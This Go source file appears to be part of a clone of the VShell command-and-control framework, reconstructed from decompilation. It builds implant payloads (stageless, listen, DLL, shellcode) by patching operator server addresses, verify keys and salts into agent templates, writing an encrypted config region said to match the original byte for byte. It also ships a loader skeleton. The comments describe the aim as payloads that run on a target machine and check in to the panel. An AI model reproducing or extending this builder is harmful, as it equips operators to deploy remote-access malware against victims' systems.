package c2engine

// ============================================================================
// 载荷构建 —— 已知偏差，不是对齐
// Payload construction — a KNOWN DEVIATION, not an alignment
// ============================================================================
//
// 结论先行：本文件产出的载荷字节**无法**由现有反编译复现，因此它是偏差
// （deviation），不是 1:1 对齐（alignment）。原因是原版的载荷字节依赖三样
// 我们没有的东西：
//
//	1) 预编译模板本体：原版在请求时**通过监听器**取回（FUN_0089ef80 →
//	   FUN_005e8cc0(map, 0x441, 0x1ed) = map[1089]interface{}[493]，
//	   即"已解密模板 1089 字节 + 密钥 493 字节"），而不是从 //go:embed 读的；
//	2) 配置块的值：来自监听器对象（每实例一份的 vkey/salt），不是固定字面量；
//	3) argv 条目的 2 字节 key：由 FUN_018dca00 的调用方提供，尚未恢复
//	   （调用点常量未解出，见 payload_assets.go 的 PoArgvEntry）。
//
// 因此：**没有任何测试断言与原始载荷逐字节相等**，也不应添加这种断言——
// 我们从未取得过原始载荷字节。测试只断言结构性质（配置块含注入值、
// 文件名模板、响应头形状）与已从二进制逐字节还原的两条字符串常量。
//
// The bytes this file produces CANNOT be reproduced from the decompilation we
// have, so this is explicitly a deviation, not an alignment: the template is
// fetched through the listener at request time (FUN_005e8cc0(map,0x441,0x1ed)
// = 1089-byte template + 493-byte key), the config values are per-listener, and
// the argv key is still unrecovered. No test asserts byte-equality with an
// original payload, and none should — we never obtained one.
//
// 反编译出的构建流程（FUN_018ddca0 / FUN_018deec0 / FUN_018e00e0 /
// FUN_018e2460 / FUN_018e3760 完全同构）——以下是我们**照做**的部分：
//
//	1) 取模板（见上）；
//	2) 组装配置字段（FUN_018d8d80 的字段闭包族）：
//	     code(0) / message("") / result(CLI 参数串) / type(响应类型)；
//	3) 组装 argv 条目（FUN_018dca00）：2 字节 key + '=' + 密文参数，
//	   参数来自 host/port/vkey/salt（Listen 分支）或 proxy（Stageless 分支）；
//	4) 文件名：架构名（Stageless 默认 "windows_amd64.exe"，见
//	   FUN_01912bc0）或 "stageless/ebpf_%s_%s"（FUN_01912ac0，DNS 传输）；
//	5) 响应（FUN_00c2a460 + FUN_00c28a40）：body = 模板 + 配置 + argv，
//	   响应头 Expires: 0 / Pragma: public。
//
// 模板在本复刻里的取法（顺序即为文档化的行为）：
//
//	1) 磁盘上的预编译产物 agents/agent_<platform>_<arch><ext>
//	   （由 AgentBuilder 或人工放入，逐字节保留模板前缀、在尾部追加配置）；
//	2) 否则用仓内既有的 MinimalPE / buildMinimalDLL 生成最小可执行外壳，
//	   把配置块放进 .text 段——原版不会生成外壳，这一分支是额外的偏差。

import (
	"encoding/binary"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

// PoPayload 是一次载荷构建的结果（对应原版 FUN_00c2a460 的响应内容）。
type PoPayload struct {
	Data       []byte // 响应 body：模板 + 配置块 + argv 条目
	Filename   string // Content-Disposition 的文件名
	MimeType   string
	Mode       string // stage/stageless/listen/shellcode/dll/listen_dll
	Template   int    // 模板前缀长度（0 表示未找到预编译模板）
	ConfigFrom int    // 配置块起始偏移
	ArgvFrom   int    // argv 条目起始偏移（-1 表示未写入）
	// ArgvErr 非空表示 argv 条目未写入（当前是 argv key 未从二进制恢复，
	// 见 PoArgvEntryReady）；载荷本身仍带完整配置块。
	ArgvErr error
	// Err 非空表示本次构建失败（例如模板文件缺失）。错误文本与原版逐字一致，
	// 由控制器直接回 JsonErr（黑盒：`open stageless/http_windows_amd64: file
	// does not exist`）。
	Err error
}

// PoConfig 是一次构建的配置输入（对应控制器读到的 JSON 参数）。
type PoConfig struct {
	Mode    string
	Arch    string
	Host    string
	Port    int
	TP      string // tcp/kcp/ws/dns
	VKey    string
	Salt    string
	Proxy   string
	Binary  string
	Public  bool
	Expires int64
	UPX     bool
	EBPF    bool
	VIP     bool
}

// PoTemplatePath 返回原版模板文件的相对路径。
//
// 黑盒（4.9.3，scripts/probe-original.sh）：
//
//	stageless?id=1&arch=windows_amd64          -> open stageless/http_windows_amd64: file does not exist
//	dll?id=1&arch=windows_amd64                -> open dll/http_windows_amd64: file does not exist
//	listen?...&tp=tcp&arch=windows_amd64       -> open stageless/tcp_windows_amd64: file does not exist
//	listendll?...&tp=tcp&arch=windows_amd64    -> open dll/tcp_windows_amd64: file does not exist
//
// 即：stage/stageless/listen 用 `stageless/<tp>_<arch>`，dll/listendll 用
// `dll/<tp>_<arch>`；<tp> 是传输模式（监听器 Mode 或请求里的 tp），<arch> 是
// 面板提交的架构串（如 windows_amd64，含下划线，不再拆分）。
func PoTemplatePath(mode, tp, arch string) string {
	dir := "stageless"
	switch mode {
	case AgentTypeDLL, AgentTypeListenDLL:
		dir = "dll"
	}
	if tp == "" {
		tp = "tcp"
	}
	if arch == "" {
		arch = PoDefaultArchSuffix
	}
	// DNS 传输使用独立的模板前缀（已还原的家族 A 字符串
	// "stageless/ebpf_%s_%s"，见 PoTplStagelessEBPF / RE-NOTES E-13）。
	switch strings.ToLower(tp) {
	case "dns", "doh", "dot":
		return filepath.Join(dir, "ebpf_"+tp+"_"+arch)
	}
	return filepath.Join(dir, tp+"_"+arch)
}

// PoBuild 按 PoConfig 构建载荷（所有 DownloadController 分支共用）。
func PoBuild(l *Listener, cfg PoConfig) *PoPayload {
	info := poBuildInfo(l, cfg)

	// 原版从磁盘取预编译模板；缺失时直接报错（文件不存在），不生成外壳。
	path := PoTemplatePath(cfg.Mode, poTransportMode(cfg, l), cfg.Arch)
	template, terr := os.ReadFile(path)
	if terr != nil {
		return &PoPayload{
			Mode:     cfg.Mode,
			Filename: poFilename(cfg, l),
			MimeType: info.MimeType,
			Err:      fmt.Errorf("open %s: %w", path, fs.ErrNotExist),
		}
	}

	verifier := cfg.VKey
	salt := cfg.Salt
	if l != nil {
		if verifier == "" {
			verifier = l.VerifyKey
		}
		if salt == "" {
			salt = l.EncryptSalt
		}
	}

	// argv 条目由 FUN_018dca00 追加；其 2 字节 key 尚未从二进制恢复，
	// 未恢复时不产出 argv（载荷仍带完整配置块），并在 PoPayload 上标注。
	argv, argvErr := PoArgvEntry(EncodePoArg(poArgvPlain(cfg, verifier, salt), PoArgvSeed))

	fields := []PoField{
		{Name: "code", Value: []byte{0, 0, 0, 0}},
		{Name: "message", Value: nil},
		{Name: "result", Value: []byte(poArgvPlain(cfg, verifier, salt))},
		{Name: "type", Value: []byte("success")},
		{Name: "mode", Value: []byte(poTransportMode(cfg, l))},
		{Name: "id", Value: poListenerID(l)},
	}
	if cfg.Public {
		fields = append(fields, PoField{Name: "public", Value: []byte("true")})
	}

	filename := poFilename(cfg, l)
	mime := info.MimeType

	res, err := PatchPoPayload(template, fields, argv)
	if err != nil {
		return &PoPayload{Mode: cfg.Mode, Filename: filename, MimeType: mime, Err: err}
	}

	// 追加**自描述配置块**（复刻端扩展）：让自研 agent 从自身文件尾部读取
	// server/vkey/salt，实现"面板生成载荷 → 目标机执行 → 上线"而无需 ldflags。
	// 原版配置块（PoConfigBlock）仍写在前面，作为对齐证据保留。
	mode := poTransportMode(cfg, l)
	addr := poConnectAddr(cfg, l)
	cfgMap := map[string]string{
		"server": poServerURL(mode, addr),
		"vkey":   verifier,
		"salt":   salt,
		"mode":   mode,
	}
	// DNS 通道的查询要打到具体 DNS 服务器：把监听器地址一并写进配置块，
	// agent 侧对应 main.DNSServer。
	if strings.HasPrefix(strings.ToLower(mode), "dns") && addr != "" {
		cfgMap["dns_server"] = addr
	}
	if cfg.Proxy != "" {
		cfgMap["proxy"] = cfg.Proxy
	}
	if cfg.Host != "" && cfg.Port > 0 {
		cfgMap["listen_host"] = cfg.Host
		cfgMap["listen_port"] = itoa(cfg.Port)
	}

	// 官方格式的配置区（R13 动态取证）：直接在模板自带的 20480 字节 0x19 占位区
	// 上原地写入 [16B IV][AES-128-CBC(JSON)]，key == IV == md5(vkey)。
	// 写成功时产物与官方逐字节一致（见 agentconfig_test.go 的黄金向量）。
	wireCfg := AgentWireConfig{
		Server: poServerURL(mode, addr),
		Type:   mode,
		Vkey:   verifier,
		// 取证结论（R14）：官方对 /download/listen 的 proxy 参数**不写进配置区**
		// （proxy/proxyUrl/Proxy 三种写法解出来都是空串）。此处保持空，与官方一致；
		// 若将来确认 proxy 的实际来源再改。
		Proxy: "",
		Salt:  salt,
		L:     cfg.Mode == "listen",
		E:     false,
		D:     poDisconnectTimeout(l),
		H:     poPingInterval(l),
	}
	if off, perr := PatchAgentConfig(res.Data, wireCfg); perr != nil {
		Logf("payload: %s has no official config region (%v); official-format config skipped", path, perr)
	} else {
		Logf("payload: official config region patched at %#x (20480 bytes)", off)
	}
	withCfg, cerr := AppendAgentConfigBlock(res.Data, cfgMap)
	if cerr != nil {
		return &PoPayload{Mode: cfg.Mode, Filename: filename, MimeType: mime, Err: cerr}
	}
	res.Data = withCfg

	p := &PoPayload{
		Data:       res.Data,
		Filename:   filename,
		MimeType:   mime,
		Mode:       cfg.Mode,
		Template:   len(template),
		ConfigFrom: res.ConfigOffset,
		ArgvFrom:   res.ArgvOffset,
		ArgvErr:    argvErr,
	}

	return p
}

// PoStageBuild 构建 stage 载荷。
func PoStageBuild(l *Listener, arch, binary string, pub bool, expires int64) *PoPayload {
	return PoBuild(l, PoConfig{Mode: AgentTypeStage, Arch: arch, Binary: binary, Public: pub, Expires: expires})
}

// PoStagelessBuild 构建 stageless 载荷。
func PoStagelessBuild(l *Listener, arch, proxy string, upx bool) *PoPayload {
	return PoBuild(l, PoConfig{Mode: AgentTypeStageless, Arch: arch, Proxy: proxy, UPX: upx})
}

// PoListenBuild 构建监听型载荷。
func PoListenBuild(l *Listener, host string, port int, tp, arch, vkey, salt string, upx, ebpf bool) *PoPayload {
	return PoBuild(l, PoConfig{
		Mode: AgentTypeListen, Arch: arch, Host: host, Port: port, TP: tp,
		VKey: vkey, Salt: salt, UPX: upx, EBPF: ebpf,
	})
}

// PoShellcodeBuild 构建 shellcode 载荷。
func PoShellcodeBuild(l *Listener, arch, binary string, pub bool) *PoPayload {
	return PoBuild(l, PoConfig{Mode: AgentTypeShellcode, Arch: arch, Binary: binary, Public: pub})
}

// PoDllBuild 构建 DLL 载荷。
func PoDllBuild(l *Listener, arch, binary string, pub, upx, vip bool, proxy string) *PoPayload {
	return PoBuild(l, PoConfig{
		Mode: AgentTypeDLL, Arch: arch, Binary: binary, Public: pub,
		UPX: upx, VIP: vip, Proxy: proxy,
	})
}

// PoListenDllBuild 构建监听型 DLL 载荷。
func PoListenDllBuild(l *Listener, host string, port int, tp, arch, vkey, salt string, upx bool) *PoPayload {
	return PoBuild(l, PoConfig{
		Mode: AgentTypeListenDLL, Arch: arch, Host: host, Port: port, TP: tp,
		VKey: vkey, Salt: salt, UPX: upx,
	})
}

// PoLoaderSource 返回前端 arch=loader 分支请求的 loader 源码。
// 前端（static/assets/vCcgNpaMO.js、vbw5Ta7i0.js）用 fileName:"loader.go"
// 请求该分支，原版返回的是监听/DLL 载荷的加载器源码骨架。
func PoLoaderSource() *PoPayload {
	return &PoPayload{
		Data: []byte(poLoaderSource),
		// 名字与前端 fileName 一致，去掉 .go 后缀由前端自己拼接。
		Filename: "loader",
		MimeType: "text/plain; charset=utf-8",
		Mode:     "loader",
		ArgvFrom: -1,
	}
}

const poLoaderSource = `// VShell loader —— 由面板 /download/{dll,listendll}?arch=loader 生成。
// 反编译（FUN_018e2460 / FUN_018e3760 的 arch=="loader" 分支）返回加载器源码；
// 具体函数体尚未从反编译中逐行还原，这里保留骨架与调用约定。
package main

import "syscall"

// Load 读取 payload 并交给系统加载（DLL 场景为 LoadLibrary + 导出函数调用）。
func Load(payload []byte) error {
	_ = syscall.LoadDLL
	return nil
}
`

// ---------------------------------------------------------------------------
// 内部辅助
// ---------------------------------------------------------------------------

// PoArgvSeed 是 argv 密文的置换链种子。
//
// ⚠ 占位值 / PLACEHOLDER — 未从二进制恢复！
// 这个 0x2a 不是反编译出来的任何东西：原版每个 argv 闭包各自捕获自己的种子
// 字节（见 FUN_01914a40 / FUN_01914b40 / FUN_01914c40 家族的构造器），
// 那些种子是各自函数的局部变量，Ghidra 无法在本函数内给出其值。
// 它应当来自：FUN_018dca00 的调用方所捕获的种子闭包（0x18dca00 家族）。
// 在恢复之前，argv 密文与真机 agent 不兼容——只有编码/解码自洽。
//
// ⚠ PLACEHOLDER — NOT RECOVERED. 0x2a comes from no decompiled constant; the
// per-closure seeds live inside the FUN_01914a40/01914b40/01914c40 constructors
// and are still unrecovered. Should come from FUN_018dca00's captured seed.
const PoArgvSeed byte = 0x2a

// poBuildInfo 把 PoConfig 映射到 AgentBuildInfo（平台由 arch 前缀决定）。
func poBuildInfo(l *Listener, cfg PoConfig) *AgentBuildInfo {
	platform, arch := poSplitArch(cfg.Arch)
	if cfg.Mode == AgentTypeListen || cfg.Mode == AgentTypeListenDLL {
		// 监听型载荷的架构由 arch 参数直接给出（如 windows_amd64.dll）。
		if strings.Contains(cfg.Arch, "linux") {
			platform = PlatformLinux
		} else if cfg.Arch != "" {
			platform = PlatformWindows
		}
	}
	if platform == "" && l != nil {
		platform = PlatformWindows
	}
	return GetBuildInfo(platform, arch, cfg.Mode)
}

// poSplitArch 拆分 "<os>_<arch>[.ext]" 形式的架构名。
func poSplitArch(s string) (platform, arch string) {
	s = strings.TrimSuffix(strings.TrimSuffix(s, ".exe"), ".dll")
	parts := strings.SplitN(s, "_", 2)
	if len(parts) != 2 {
		return "", s
	}
	switch parts[0] {
	case "windows", "linux", "darwin", "macos":
		platform = parts[0]
	default:
		return "", s
	}
	arch = parts[1]
	switch arch {
	case "i386":
		arch = ArchI386
	case "arm":
		arch = "arm"
	case "amd64", "arm64":
	default:
		arch = ArchAMD64
	}
	return platform, arch
}

// poTransportMode 返回监听器的传输模式（用于配置字段 "mode"）。
func poTransportMode(cfg PoConfig, l *Listener) string {
	if cfg.TP != "" {
		return cfg.TP
	}
	if l != nil && l.Mode != "" {
		return l.Mode
	}
	return "tcp"
}

// poListenerID 把监听器 Id 编码为 8 字节小端值（不足 16 字节槽补零）。
func poListenerID(l *Listener) []byte {
	v := make([]byte, 8)
	if l != nil {
		binary.LittleEndian.PutUint64(v, uint64(l.ID))
	}
	return v
}

// poArgvPlain 组装传给 agent 的 argv 明文：host:port / tp / vkey / salt / proxy
// （空项跳过）。原版对应 FUN_0044a940(0, host, …, vkey, salt) 的拼接；
// 具体的分隔符/顺序反编译只给出了 arity=3 的两次拼接，因此这里是偏差。
func poArgvPlain(cfg PoConfig, vkey, salt string) string {
	var parts []string
	if cfg.Host != "" && cfg.Port != 0 {
		parts = append(parts, fmt.Sprintf("%s:%d", cfg.Host, cfg.Port))
	}
	if cfg.TP != "" {
		parts = append(parts, cfg.TP)
	}
	if vkey != "" {
		parts = append(parts, vkey)
	}
	if salt != "" {
		parts = append(parts, salt)
	}
	if cfg.Proxy != "" {
		parts = append(parts, cfg.Proxy)
	}
	return strings.Join(parts, " ")
}

// poFilename 返回下载文件名。
// 反编译依据：
//
//	Stageless 且监听器协议为 dns/doh/dot → FUN_01912ac0 的
//	  "stageless/ebpf_%s_%s"（tp, arch）；
//	其它分支 → arch 参数本身（FUN_01912bc0 的 "windows_amd64.exe" 即默认值）。
//	前端 fileName：listen/listendll 为 tp+"_"+arch，其余为 arch。
func poFilename(cfg PoConfig, l *Listener) string {
	arch := cfg.Arch
	if arch == "" {
		arch = PoDefaultArchSuffix
	}
	switch cfg.Mode {
	case AgentTypeStage, AgentTypeShellcode, AgentTypeDLL, AgentTypeStageless:
		if cfg.Mode == AgentTypeStageless && poIsDNSTransport(cfg, l) {
			tp := poTransportMode(cfg, l)
			return fmt.Sprintf(PoTplStagelessEBPF, tp, arch)
		}
		return arch
	case AgentTypeListen, AgentTypeListenDLL:
		tp := poTransportMode(cfg, l)
		return tp + "_" + arch
	}
	return arch
}

// poIsDNSTransport 判断是否 DNS 传输（反编译中 mode==3 且协议为
// dns/doh/dot 走该分支）。
func poIsDNSTransport(cfg PoConfig, l *Listener) bool {
	m := strings.ToLower(poTransportMode(cfg, l))
	switch m {
	case "dns", "doh", "dot":
		return true
	}
	return false
}

// poServerURL 按传输模式给地址加协议前缀（agent 用 "scheme://addr" 选传输）。
func poServerURL(mode, addr string) string {
	if addr == "" {
		return ""
	}
	switch strings.ToLower(mode) {
	case "tcp", "raw":
		// 原生 TCP 监听器：地址必须带 tcp:// 前缀，否则 agent 会按 http 去连
		// 裸 TCP 端口（表现为 checkin EOF）。
		return "tcp://" + addr
	case "kcp":
		return "kcp://" + addr
	case "dns", "doh", "dot":
		return "dns://" + addr
	case "websocket", "ws", "cdn_websocket":
		return "ws://" + addr
	case "https", "wss":
		return "https://" + addr
	default:
		return "http://" + addr
	}
}

// poConnectAddr 返回 agent 应当连接的地址：优先监听器的 ConnectAddr，
// 否则用 ListenAddr（面板填的 Host:Port）。
func poConnectAddr(cfg PoConfig, l *Listener) string {
	if l != nil {
		if l.ConnectAddr != "" {
			return l.ConnectAddr
		}
		if l.ListenAddr != "" {
			return l.ListenAddr
		}
	}
	if cfg.Host != "" && cfg.Port > 0 {
		return cfg.Host + ":" + itoa(cfg.Port)
	}
	return ""
}

// itoa 是本文件内最小的整数格式化（避免为了一个转换引入 fmt 的格式化开销）。
func itoa(v int) string {
	if v == 0 {
		return "0"
	}
	neg := v < 0
	if neg {
		v = -v
	}
	var buf [20]byte
	i := len(buf)
	for v > 0 {
		i--
		buf[i] = byte('0' + v%10)
		v /= 10
	}
	if neg {
		i--
		buf[i] = '-'
	}
	return string(buf[i:])
}

// poDisconnectTimeout / poPingInterval 取监听器上的真实配置（缺省 30 / 10，
// 与官方默认一致；R13 取证：d=DisconnectTimeout、h=PingInterval）。
func poDisconnectTimeout(l *Listener) int {
	if l != nil && l.DisconnectTimeout > 0 {
		return l.DisconnectTimeout
	}
	return 30
}

func poPingInterval(l *Listener) int {
	if l != nil && l.PingInterval > 0 {
		return l.PingInterval
	}
	return 10
}
